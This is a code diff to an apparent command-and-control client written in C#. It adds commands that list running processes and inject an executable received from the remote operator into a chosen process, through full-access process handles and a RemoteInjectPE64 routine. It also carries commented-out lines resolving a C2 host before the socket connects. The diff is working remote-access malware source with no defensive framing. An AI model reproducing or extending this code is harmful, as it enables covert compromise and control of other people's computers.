@@ -992,6 +992,49 @@ namespace C2Client
             return encodedimage;
         }
 
+
+
+        public static string GetProcesses()
+        {
+            string res;
+            StringWriter sw = new StringWriter();
+            Process[] procs = Process.GetProcesses();
+
+            foreach(Process p in procs)
+            {
+                sw.Write(p.ProcessName + ",");
+                sw.Write(p.Id + ",");
+                sw.WriteLine(p.MainWindowTitle);
+            }
+
+            res = sw.ToString();
+
+            return res;
+        }
+
+
+        public static bool ProcessExist(string pname)
+        {
+            //processname,id,mainwindowtitle
+            string name = pname.Split(',')[0];
+            string id = pname.Split(',')[1];
+            int id2 = Convert.ToInt32(id);
+            Console.WriteLine(name);
+            Console.WriteLine(id);
+            Console.WriteLine(id2);
+            Process[] procs = Process.GetProcesses();
+            foreach(Process p in procs)
+            {
+                if(p.Id==id2 && name == p.ProcessName)
+                {
+                    return true;
+                }
+            }
+            return false;
+
+        }
+
+
         public static void Main(string[] args)
         {
 
@@ -1007,8 +1050,12 @@ namespace C2Client
             try
             {
 
+                /*args[0] = Dns.GetHostAddresses("tech69.pythonanywhere.com")[0].ToString();
+                Console.WriteLine(args[0]);*/
                 IPEndPoint ipe = new IPEndPoint(IPAddress.Parse(args[0]), Convert.ToInt32(args[1]));
 
+                //args[0] = Dns.GetHostAddresses("tech69.pythonanywhere.com")[0].ToString();
+                
                 Socket cs = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
 
                 cs.Connect(ipe);
@@ -1451,6 +1498,58 @@ namespace C2Client
                         cmd = "Loaded successfully";
 
                     }
+
+                    else if (cmd.Contains("Get-Processes")) {
+
+                        cmd = GetProcesses();
+
+                    }
+
+
+                    else if (cmd.Contains("Inject-"))
+                    {
+                       string[] command = cmd.Split('-');
+                        Console.WriteLine(command);
+                        //processname,id,mainwindowtitle
+                       string pname = command[command.Length - 1];
+                        
+                        byte[] exe = new byte[102400000];
+                        cs.Receive(exe);
+                            
+                        if (ProcessExist(pname))
+                        {
+                            cmd = "ProcessExist";
+
+                            int id = Convert.ToInt32(pname.Split(',')[1]);
+                            Console.WriteLine(id);
+                            UInt32 processallaccess = 0x000F0000 | 0x00100000 | 0xFFFF;
+
+                            IntPtr prochandle = winapi.OpenProcess(processallaccess, false, (uint) id);
+                            if (prochandle == IntPtr.Zero)
+                            {
+                                cmd = "Open Process failed";
+                            }
+                            else
+                            {
+
+                                Thread t = new Thread(() =>
+                                {
+                                    winapi.RemoteInjectPE64(exe, prochandle);
+                                }
+                                );
+                                t.Start();
+                                
+                                cmd = "Injected";
+                            }
+
+
+                        }
+                        else
+                        {
+                            cmd = "Processdoesnot exist";
+                        }
+                    }
+
 
                     else
                     {
